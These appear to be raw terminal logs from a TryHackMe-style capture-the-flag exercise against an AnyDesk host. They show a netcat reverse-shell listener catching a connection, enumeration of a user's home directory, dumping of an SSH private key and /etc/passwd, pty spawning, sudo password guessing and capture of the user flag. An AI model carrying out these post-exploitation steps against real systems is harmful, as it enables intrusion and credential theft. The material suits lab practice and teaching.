
```sh
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 6670
listening on [any] 6670 ...
connect to [10.18.21.236] from (UNKNOWN) [10.10.245.157] 41870

ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
user.txt
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
cd .ssh
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABD9rZeTfH
ijhs+GmsOHxZFRAAAAAQAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDRKiYi/W9W
QHbkLLwpAteIPK78mlrW1vSC7aX2iqWPBfxcgJC9JCzXai7T7etRxNX7EDYUIgCRJrixd9
jVjqA2mtqTnqk6LmUP9r1pB+X8c94uEK6KT58XvDul4uC/JQIGun81lRsBVeB066tt+oUu
baTo78aryPhYoT/4IQZOwYBeRyGr6crE7Pl/1y4oLo8EAllIX1U0v049EHMLENbEA4cAxa
vXWx+z5TArbSGzH+VCDHZVtp2TJHExKz3NsC0sY7KWpExZ3DuwgUCoeokDlPwX6yj/p6b/
IYUfPM8CWdj4mIv81+QC8W95y7iO0pVXKops0segA3Yl5m+q2+P1FZ8GpY8tUzdiBm96aE
pZrnWCTENYKH6NHUlFJ0UslZl+EN3cdNCh15oxk7AyLOMGSBKolRlrhtXh/QycbSZj6isu
eZc/DcxjiWxsdME5Pgx7Frj5hBXZFYSD0rc+z8m8l5raBKRe6CURl7xfEDz98QVvLObDQw
KsnWENRaQaH40AAAWAe2qT3FF87fNkeJvPXJJk79Jkq4BeruhTmYXvP3bXXYJoTOWeKMw+
jQocnea5d8+yJSJp/TFW0Gx2VjFDn8WOeobXaMm4NpUwFvJW9KhB0s81ksRDmFXb73n4Tj
OlIU302h+qJtqGKF0t3grHGeEAqAxMyXoqkx0hoUWTcbrCPBok4s4J1kzbT+sijX94M84r
4WA3ZvRpePKRAGGRQ/cTYbw2keNvdOEQlPvUCfDq0ZkLMeLZ2zDgQwDcB0YI1JIAJP8vbn
URwYm17UBQXmg7R70UP3p7uPD4DZbM7l95foF4J48GVE4AYc3Nwh/KGtnfbsG0ij1mTl7h
kInomeJLyfZvo/GEAYidOpKjVJRzbBt48EecJF4yn2YBfFoTBSzcjeCDdjcGzQlSAVV8aD
OitBYqNtKVrhaf4oumJ6RCrcdVdKwQVRMhnhK1XgSbYmzJGU21B1ioxHt8FlW0MsbTdscG
L6k1TSZslOqpx28tOT1Ifj5ttzcHkJfoH4j8b5mxQrNPZ7Jwha9m3kwpPpiKK1fy0S8yYd
0qLeC9h+Tls77NyD7/Nx6ODNGf7eN+da4TyuPmR3aXa44EekKgNZWFNx5up2VFl/e7VMrH
dSzrLIxrc17WhWzJxcI/iN5pjYyog5UaAb05apgBlXS5t4gmPfqUIGQ/OBAu2a0aoxfO/f
wLqj2/ILvEU9xCGVe3dQ7l66JkcYAZgZrnrrjmF85n3XKUKZrLEDqugmNIDfSRtb+y6YFu
qvhDtPJju/LxfaODSmnOi/qMx23rzc8zmMZAkjTm9diMsrVf065L8zFP91wiIPfpjEWtzA
qdWj5lfzOZILBb7VQAidmuGeQpc5PhOLx8F3o9zpRQHaoITgFJ/pfKYNke4A6kozNMIOHo
AQCi1++HdEUMQ0hrCnEF6rByOD2ZLAFD0tNRApI5DL2dq/TxUWNzqP+jTzKHn/jAeNvp49
7khP8Qt+hJMNRWfmg3sQF3PaL44VdUoGAPs1yuhkzsB3Dx0dxgdk72DUFkSiCehqXrZuhW
U9aPrvYMrtIOFhKVMWUDzEGHcRoRXQE8xf8/iHGFfFpovhy48pS0NbS467/tJLooLgs3OX
N/Qp50kAfm4pCZiLSdzPlclf5v3jUEtYBA++5X1eYaKCuMVkRU8GfD/pxWJr7nxL430d+h
oUlwSqgDnBwtzXuxQDc0JyIJWhendbCPPvdV9r1/LNVONm7CfQLIjijdlFKyhN1jh/aCUK
wVxenTxiOJfBIlNeCSkiW6frv2E9d2IpfffvdLVDSfnqPxNUbfBzloWGWPq4S3nV/umq+I
fuPwCKVSytX9QZK/jXCrNR4URzwN/kfHXVIGj2hTocXe85Im3aVKx2lDz6XamicbhwekUJ
tuzlQWEVoAhQdgtezoFw+snqIUt135EzaGDN/ZFgm5WpUxo+R6X9CJEGrVtnOO45WvVC0L
ZSbsHyN0cybWegM9UaPq9tokWO5kPl7oe7F5yAHXmx5Y7dkiNMNxR22K7So5IKDrBO0w2Q
qaEaiiC/QLvMYkSt+HSqQmA8/+h6hsOokXIavBUvxrZAjB//q0VJKNrIBCnA7nyaGu2Nnb
yq/T4wQ+i8YGlD+HQR9yBTRhm5XvjxWJ8paZZ2UTrFXNeaaUY7cuRnjmnzwRoPrryDZ2/6
LKUc8yns2159BqnTm1bXnMN5V/qEUWklgm2GG3tR3vNls1tuOwJqj/HEuDGgZaGFMiMes/
MpOFI6rE6lMZX9Ol8H6MMYCWgdyIahQVsuPOod6qgT4lWQ3wtybJkwVX1KnZfi6sfquFF1
KNbGqyza4/ivQMiGYN3N4r2J6Q0h1q8blyB7dz/C+Zll0vjS204wwznH1M3lc8ueBzaTfZ
b1Da9w==
-----END OPENSSH PRIVATE KEY-----
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRKiYi/W9WQHbkLLwpAteIPK78mlrW1vSC7aX2iqWPBfxcgJC9JCzXai7T7etRxNX7EDYUIgCRJrixd9jVjqA2mtqTnqk6LmUP9r1pB+X8c94uEK6KT58XvDul4uC/JQIGun81lRsBVeB066tt+oUubaTo78aryPhYoT/4IQZOwYBeRyGr6crE7Pl/1y4oLo8EAllIX1U0v049EHMLENbEA4cAxavXWx+z5TArbSGzH+VCDHZVtp2TJHExKz3NsC0sY7KWpExZ3DuwgUCoeokDlPwX6yj/p6b/IYUfPM8CWdj4mIv81+QC8W95y7iO0pVXKops0segA3Yl5m+q2+P1FZ8GpY8tUzdiBm96aEpZrnWCTENYKH6NHUlFJ0UslZl+EN3cdNCh15oxk7AyLOMGSBKolRlrhtXh/QycbSZj6isueZc/DcxjiWxsdME5Pgx7Frj5hBXZFYSD0rc+z8m8l5raBKRe6CURl7xfEDz98QVvLObDQwKsnWENRaQaH40=
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
sudo -l
sudo: no tty present and no askpass program specified
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
annie:x:1000:1000:Annie Dash,,,:/home/annie:/bin/bash
cups-pk-helper:x:106:111:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:107:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
pulse:x:111:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
geoclue:x:114:122::/var/lib/geoclue:/usr/sbin/nologin
gdm:x:115:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Mar 23  2022 .
drwxr-xr-x 22 root root 4096 Mar 23  2022 ..
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
cd ..
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
cat user.txt
THM{N0t_Ju5t_ANY_D3sk}
id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
sudo -l
sudo: no tty present and no askpass program specified
python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ sudo -l
```

```sh
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
cat authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRKiYi/W9WQHbkLLwpAteIPK78mlrW1vSC7aX2iqWPBfxcgJC9JCzXai7T7etRxNX7EDYUIgCRJrixd9jVjqA2mtqTnqk6LmUP9r1pB+X8c94uEK6KT58XvDul4uC/JQIGun81lRsBVeB066tt+oUubaTo78aryPhYoT/4IQZOwYBeRyGr6crE7Pl/1y4oLo8EAllIX1U0v049EHMLENbEA4cAxavXWx+z5TArbSGzH+VCDHZVtp2TJHExKz3NsC0sY7KWpExZ3DuwgUCoeokDlPwX6yj/p6b/IYUfPM8CWdj4mIv81+QC8W95y7iO0pVXKops0segA3Yl5m+q2+P1FZ8GpY8tUzdiBm96aEpZrnWCTENYKH6NHUlFJ0UslZl+EN3cdNCh15oxk7AyLOMGSBKolRlrhtXh/QycbSZj6isueZc/DcxjiWxsdME5Pgx7Frj5hBXZFYSD0rc+z8m8l5raBKRe6CURl7xfEDz98QVvLObDQwKsnWENRaQaH40=
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
sudo -l
sudo: no tty present and no askpass program specified
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
annie:x:1000:1000:Annie Dash,,,:/home/annie:/bin/bash
cups-pk-helper:x:106:111:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:107:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:109:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
avahi:x:110:116:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
pulse:x:111:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
colord:x:112:120:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
geoclue:x:114:122::/var/lib/geoclue:/usr/sbin/nologin
gdm:x:115:123:Gnome Display Manager:/var/lib/gdm3:/bin/false
sshd:x:116:65534::/run/sshd:/usr/sbin/nologin
ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Mar 23  2022 .
drwxr-xr-x 22 root root 4096 Mar 23  2022 ..
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
ls -la
total 16
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-------  1 annie annie  553 Mar 23  2022 authorized_keys
-rw-rw-r--  1 annie annie 2635 Mar 23  2022 id_rsa
cd ..
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
cat user.txt
THM{N0t_Ju5t_ANY_D3sk}
id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
sudo -l
sudo: no tty present and no askpass program specified
python3 -c 'import pty;pty.spawn("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ sudo -l
sudo -l
[sudo] password for annie: 

Sorry, try again.
[sudo] password for annie: annie123

Sorry, try again.
[sudo] password for annie: annie123

sudo: 3 incorrect password attempts
annie@desktop:/home/annie$ ls -la
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
annie@desktop:/home/annie$ cd Desktop
cd Desktop
annie@desktop:/home/annie/Desktop$ ls -la
ls -la
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie/Desktop$ cd ..
cd ..
annie@desktop:/home/annie$ ls -la
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
annie@desktop:/home/annie$ ls -la Documents
ls -la Documents
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie$ ls -la Downloads
ls -la Downloads
total 4580
drwxr-xr-x  2 annie annie    4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie    4096 Mar 23  2022 ..
-rw-r--r--  1 annie annie 4678844 Feb 17  2020 anydesk_5.5.2-1_amd64.deb
annie@desktop:/home/annie$ ls -la Music
ls -la Music
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie$ ls -la Pictures
ls -la Pictures
total 172
drwxr-xr-x  2 annie annie   4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie   4096 Mar 23  2022 ..
-rw-rw-r--  1 annie annie 166999 Feb 27  2019 redhead-annie-1389225_960_720.jpg
annie@desktop:/home/annie$ ls -la Public
ls -la Public
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie$ ls -la Templates
ls -la Templates
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 ..
annie@desktop:/home/annie$ ls -la
ls -la
total 96
drwxr-xr-x 17 annie annie 4096 Mar 23  2022 .
drwxr-xr-x  3 root  root  4096 Mar 23  2022 ..
-rw-------  1 annie annie  640 Mar 23  2022 .ICEauthority
drwxr-xr-x  3 annie annie 4096 Mar 23  2022 .anydesk
-rwxrwxr-x  1 annie annie   41 Mar 23  2022 .anydesk.sh
lrwxrwxrwx  1 annie annie    9 Mar 23  2022 .bash_history -> /dev/null
-rw-r--r--  1 annie annie  220 Mar 23  2022 .bash_logout
-rw-r--r--  1 annie annie 3771 Mar 23  2022 .bashrc
drwx------  8 annie annie 4096 Mar 23  2022 .cache
drwx------  9 annie annie 4096 Mar 23  2022 .config
drwx------  3 annie annie 4096 Mar 23  2022 .dbus
drwx------  3 annie annie 4096 Mar 23  2022 .gnupg
drwx------  3 annie annie 4096 Mar 23  2022 .local
-rw-r--r--  1 annie annie  807 Mar 23  2022 .profile
-rw-r--r--  1 root  root    66 Mar 23  2022 .selected_editor
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .ssh
-rw-r--r--  1 annie annie    0 Mar 23  2022 .sudo_as_admin_successful
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Desktop
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Documents
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Downloads
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Music
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Pictures
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Public
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Templates
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 Videos
-rw-rw-r--  1 annie annie   23 Mar 23  2022 user.txt
annie@desktop:/home/annie$ ls -la Videos
ls -la Videos
total 8
drwxr-xr-x  2 annie annie 4096 Mar 23  2022 .
